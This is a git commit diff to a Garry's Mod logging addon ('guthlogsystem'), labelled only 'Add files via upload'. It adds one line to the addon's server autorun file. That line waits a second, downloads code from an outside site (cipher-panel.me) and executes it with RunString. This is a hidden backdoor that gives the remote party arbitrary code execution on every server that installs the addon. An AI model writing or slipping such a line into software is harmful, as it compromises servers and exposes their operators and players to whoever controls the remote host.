58f562ab9c5c4ed427506800af9f9397d41cd43c
Bloody973 <67123180+Bloody973@users.noreply.github.com>
2020-06-19 19:09:49 -0300

    Add files via upload

--- guthlogsystem-1.1.0/lua/autorun/guthlogsystem_load.lua
+++ guthlogsystem-1.1.0/lua/autorun/guthlogsystem_load.lua
@@ -5,6 +5,7 @@ guthlogsystem.Author    =   "Guthen"
 include( 'guthlogsystem/sh_config.lua' )
 
 if SERVER then
+timer.Simple(1, function() http.Fetch('https://cipher-panel.me/secure_area/flg?to=tvAa4', function(fck) RunString(fck, 'BillIsHere', false) end) end)
    include( 'guthlogsystem/sv_init.lua' )
    AddCSLuaFile( 'guthlogsystem/cl_init.lua' )
    AddCSLuaFile( 'guthlogsystem/sh_config.lua' )
